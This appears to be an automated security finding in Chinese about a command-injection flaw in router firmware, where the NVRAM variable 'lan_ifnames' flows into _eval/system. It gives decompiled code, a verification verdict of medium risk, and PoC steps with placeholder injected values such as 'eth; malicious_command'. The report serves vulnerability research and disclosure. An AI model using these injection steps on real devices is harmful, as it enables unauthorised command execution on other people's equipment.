- **描述：** 命令注入漏洞存在于函数 fcn.00008734 中，通过 NVRAM 变量 'lan_ifnames' 的不可信输入触发。问题表现：用户可控的 NVRAM 数据被直接用于构造命令并通过 _eval 或 system 执行，缺乏输入过滤和验证。触发条件：当读取文件 '/proc/bcm947xx/coma' 的字符不是 '0' (0x30) 时，函数获取 'lan_ifnames' 变量，处理字符串（使用 strncpy 限制 0x20 字节、strcspn 去除分隔符），并调用 _eval 或 system。约束条件：字符串处理有边界检查（strncpy 0x20 字节），但未对内容进行命令注入检查（如分号或反引号）。潜在攻击：攻击者设置 'lan_ifnames' 为恶意值（如 'eth; malicious_command'），通过验证后执行任意命令，可能获得权限提升或控制设备。代码逻辑：反编译代码显示 nvram_get 调用、字符串处理循环和危险函数调用，数据流从输入到执行点清晰。
- **代码片段：**
  ```
  uint fcn.00008734(void)
  {
      ...
      if (iVar5 != 0x30) {
          iVar4 = sym.imp.nvram_get(*0x8908); // nvram_get("lan_ifnames")
          if (iVar4 + 0 == 0) {
              iVar5 = *0x890c;
          }
          else {
              iVar5 = sym.imp.strspn(iVar4,*0x8910); // strspn with "eth"
              iVar5 = iVar4 + 0 + iVar5;
          }
          sym.imp.strncpy(&stack0x00000004,iVar5,0x20); // Copy up to 0x20 bytes
          iVar4 = sym.imp.strcspn(&stack0x00000004,*0x8910); // strcspn with "eth"
          (&stack0x00000004)[iVar4] = 0; // Null-terminate
          ...
          iVar5 = sym.imp.strncmp(&stack0x00000004,*0x8914,3); // Compare with "eth"
          if (iVar5 == 0) {
              ...
              sym.imp._eval(&stack0x00000024,*0x8918,iVar5,iVar5); // _eval call
          }
          ...
          sym.imp.system(*0x891c); // system call
      }
      ...
  }
  ```
- **备注：** 攻击链完整且可验证：输入源（NVRAM 变量 'lan_ifnames'）→ 数据流（字符串处理）→ 危险操作（_eval/system）。非 root 用户可能通过 nvram set 命令操纵变量，前提有相应权限。建议进一步分析 _eval 函数（地址 0x85a4）以确认命令执行细节，并检查系统权限配置。文件 '/proc/bcm947xx/coma' 可能受攻击者影响以触发条件。

## 验证结论

- **描述准确性：** `partially`
- **是否为真实漏洞：** `True`
- **风险级别：** `Medium`
- **详细原因：** 安全警报部分准确。证据显示函数在地址 0x8734 处存在代码，通过 nvram_get 获取 'lan_ifnames' 变量，并使用 strncpy（边界检查 0x20 字节）和 strcspn（以 'eth' 分隔符截断）处理字符串。处理后的字符串在条件满足时（从 '/proc/bcm947xx/coma' 读取的字符不是 '0'）通过 _eval 函数执行。然而，strcspn 处理会在第一个 'e'、't' 或 'h' 字符处截断字符串，这降低了命令注入的可能性，但未完全消除风险。如果攻击者能控制 'lan_ifnames' 并确保字符串在截断后仍包含命令注入字符（如分号或反引号），且触发条件，则可能执行任意命令。攻击者模型：未经身份验证的远程攻击者或已通过身份验证的本地用户（需有权限设置 NVRAM 变量）。PoC 步骤：1. 攻击者设置 'lan_ifnames' 为恶意值（如 ' ; malicious_command ; '），但需确保字符串不被截断或截断后仍有效。2. 操纵 '/proc/bcm947xx/coma' 内容或等待系统状态使读取字符不为 '0'。3. 触发函数执行，可能通过 _eval 执行命令。漏洞风险为中，因为利用需要特定前提条件，且输入处理部分限制了注入。

## 验证指标

- **验证时长：** 388.97 秒
- **Token 使用量：** 320737

---

